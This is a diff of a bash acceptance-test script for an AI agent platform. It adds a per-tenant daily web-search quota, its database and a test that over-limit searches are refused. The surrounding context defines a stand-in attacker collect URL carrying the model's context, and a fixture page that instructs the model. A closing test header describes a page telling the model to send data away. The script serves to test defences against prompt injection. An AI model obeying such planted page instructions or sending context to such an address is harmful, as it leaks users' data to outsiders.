@@ -72,7 +72,7 @@ if [[ ! -f "$ENVF" ]] || ! grep -q EER_RUNTIME_APP_PASSWORD "$ENVF"; then
              EER_RUNTIME_OWNER_PASSWORD EER_RUNTIME_APP_PASSWORD EER_RUNTIME_READONLY_PASSWORD EER_INTELLIGENCE_OWNER_PASSWORD EER_INTELLIGENCE_APP_PASSWORD; do echo "$v=$(openssl rand -hex 16)"; done
     echo "IDP_HOST_CREDENTIAL_KEY=$(openssl rand -hex 32)"; } > "$ENVF"
 fi
-for v in IDP_MCP_DB_PASSWORD IDP_MCP_ADMIN_SECRET IDP_FILES_S3_ACCESS_KEY IDP_FILES_S3_SECRET_KEY; do grep -q "^$v=" "$ENVF" || echo "$v=$(openssl rand -hex 16)" >> "$ENVF"; done
+for v in IDP_MCP_DB_PASSWORD IDP_WEB_DB_PASSWORD IDP_MCP_ADMIN_SECRET IDP_FILES_S3_ACCESS_KEY IDP_FILES_S3_SECRET_KEY; do grep -q "^$v=" "$ENVF" || echo "$v=$(openssl rand -hex 16)" >> "$ENVF"; done
 grep -q "^IDP_FILES_S3_MASTER_KEY=" "$ENVF" || echo "IDP_FILES_S3_MASTER_KEY=$(openssl rand -base64 32)" >> "$ENVF"
 set -a; source "$ENVF"; set +a
 
@@ -260,7 +260,9 @@ chmod 644 "$L/egress.key" "$L/egress-tenants.yaml"
 # the fixture search provider, whose results point at the test origins: what a query containing "october" finds is the article, one
 # containing "bulletin" the page that carries the instruction (the first entry that matches wins)
 head -c 48 /dev/urandom | base64 -w0 > "$L/web-ref.key"
-printf 'default: {enabled: false}\ntenants:\n  %s: {enabled: true, openUrl: true}\n' "$TENANT" > "$L/web-tenants.yaml"
+# dailySearches: 3 is the daily quota PATH M3 uses up (PATH M searches once, M3 the other two and is refused the next; M3 then
+# zeroes the count so that PATH N has its own searches)
+printf 'default: {enabled: false}\ntenants:\n  %s: {enabled: true, openUrl: true, dailySearches: 3}\n' "$TENANT" > "$L/web-tenants.yaml"
 WEB_ARTICLE="http://$WEB_ORIGIN/article.html" WEB_BULLETIN="http://$WEB_ORIGIN/bulletin.html" WEB_COLLECT="http://$WEB_ATTACKER/collect?d=CONTEXT"
 cat > "$L/web-fixture.yaml" <<YAML
 entries:
@@ -289,7 +291,7 @@ for _ in $(seq 1 60); do
   s3 -f -o /dev/null "http://127.0.0.1:19500/member-files?list-type=2&max-keys=1" 2>/dev/null && break; sleep 0.5
 done
 s3 -f -o /dev/null "http://127.0.0.1:19500/member-files?list-type=2&max-keys=1" || { "${C[@]}" logs --tail 20 files-s3; echo "BLOCKED: the members' file store has no bucket" >&2; exit 2; }
-for db in idp_cmi idp_host idp_workspace idp_mcp eer; do "${C[@]}" exec -T postgres psql -U postgres -q -c "CREATE DATABASE $db" >/dev/null; done
+for db in idp_cmi idp_host idp_workspace idp_mcp idp_web eer; do "${C[@]}" exec -T postgres psql -U postgres -q -c "CREATE DATABASE $db" >/dev/null; done
 "${C[@]}" up -d keycloak eer-temporal
 for _ in $(seq 1 120); do "${KC[@]}" -o /dev/null "$ISSUER/.well-known/openid-configuration" && break; sleep 1; done
 "${KC[@]}" -o /dev/null "$ISSUER/.well-known/openid-configuration" || { "${C[@]}" logs --tail 30 keycloak; echo "BLOCKED: Keycloak did not come up" >&2; exit 2; }
@@ -321,6 +323,9 @@ field() { python3 -c "import json,sys; print(json.load(sys.stdin)$1)"; }
 # idp-mcp: registry, a gateway that verifies Keycloak tokens, and the sandbox as its upstream
 "${C[@]}" run --rm -T mcp-admin migrate >/dev/null
 "${C[@]}" run --rm -T mcp-admin ensure-login idp_mcp_svc >/dev/null
+# idp-web's database: the daily quota and the numbers of the sources (idp-web ADR-0001 D28, D29); it does not start on an unmigrated schema
+"${C[@]}" run --rm -T web-admin migrate >/dev/null
+"${C[@]}" run --rm -T web-admin ensure-login idp_web_svc >/dev/null
 got="$("${C[@]}" run --rm -T mcp-admin seed-tenant acme "$TENANT" | sed -n 's/^TENANT_ID=//p')"
 [[ "$got" == "$TENANT" ]] || { echo "BLOCKED: mcp tenant $got != $TENANT" >&2; exit 2; }
 "${C[@]}" up -d mcp-registry sandbox egress-origin web web-origin web-attacker   # the sandbox brings its egress proxy with it
@@ -1002,6 +1007,30 @@ echo "PASS: PATH M — bob -> Workspace -> HOST run $MRUN (web-assistant) -> gat
 MCHECK="$(python3 -I deploy/compose/client_check.py "$ISSUER" "$L/tls/ca.crt" "$L/clients.json" http://mcp-gateway:3320/mcp http://127.0.0.1:3320/mcp)" \
   || { "${C[@]}" logs --tail 20 mcp-gateway; exit 1; }
 echo "PASS: PATH M2 — the web tools are only the HOST's: $MCHECK"
+
+# ---- PATH M3: the daily quota (idp-web ADR-0001 D28): this tenant may search 3 times a day; bob's runs use what is left, the next is refused ----
+# The searches are the HOST's, made through the gateway for bob (a run each, as PATH M). The limit is 3 and PATH M used one; the check
+# reads what the database counts rather than assuming it, runs as many as are left, and the next run is told the limit is used up. The
+# provider is the fixture, which logs nothing; what shows that it was not asked for the refused search is that the count stays at the
+# limit (a refused take adds nothing) and that idp-web's audit line has no result. The count is zeroed afterwards, so that PATH N,
+# which searches too, has its own: the acceptance zeroes it as an operator may (idp-web RUNBOOK 9), as the owner.
+web_sql() { "${C[@]}" exec -T postgres psql -U postgres -d idp_web -Atc "$1"; }
+SEARCHES_TODAY="SELECT coalesce(sum(used), 0) FROM daily_usage WHERE tenant = '$TENANT' AND kind = 'searches' AND day = (now() AT TIME ZONE 'utc')::date"
+MLIMIT=3; MUSED="$(web_sql "$SEARCHES_TODAY")"
+(( MUSED >= 1 && MUSED < MLIMIT )) || { echo "FAIL: PATH M3: the database counts $MUSED searches of $MLIMIT after PATH M (it made one, so 1 or 2 is right; if the check ran across 00:00 UTC, run it again)" >&2; exit 1; }
+M3Q="$MQ again"; M3LEFT=$(( MLIMIT - MUSED ))
+for _ in $(seq 1 "$M3LEFT"); do
+  M3ANS="$(run_summary "$(ask_agent websearch ask "web: $M3Q")")"
+  [[ "$M3ANS" == *"41,872"* ]] || { echo "FAIL: PATH M3: a search within the limit was not answered: $M3ANS" >&2; exit 1; }
+done
+M3REFUSED="$(run_summary "$(ask_agent websearch ask "web: $M3Q")")"
+[[ "$M3REFUSED" == *"daily limit of searches for your organisation is used up"* && "$M3REFUSED" == *"00:00 UTC"* && "$M3REFUSED" != *"41,872"* ]] \
+  || { echo "FAIL: PATH M3: the search over the limit was not refused with the quota sentence: $M3REFUSED" >&2; exit 1; }
+M3USED="$(web_sql "$SEARCHES_TODAY")"
+[[ "$M3USED" == "$MLIMIT" ]] || { echo "FAIL: PATH M3: the database counts $M3USED searches after the refusal, want exactly $MLIMIT: the refused search was counted, so it went out" >&2; exit 1; }
+M3AUD="$(web_log web | python3 -I deploy/compose/web_check.py m3-audit "$M3Q" "$M3LEFT")" || { web_log web | tail -12 >&2; exit 1; }
+web_sql "DELETE FROM daily_usage WHERE tenant = '$TENANT'" >/dev/null
+echo "PASS: PATH M3 — the daily quota: $M3LEFT more searches of bob's runs went through (the limit is $MLIMIT, PATH M used $MUSED), the next was refused: '${M3REFUSED:0:120}'; $M3AUD; the database counts $M3USED, not one more"
 
 # ---- PATH N: a page tells the model to send data away, and the model does as the page says ----
 # The search finds the bulletin, whose text names an address of the attacker's and tells the reader to fetch it with the context. The
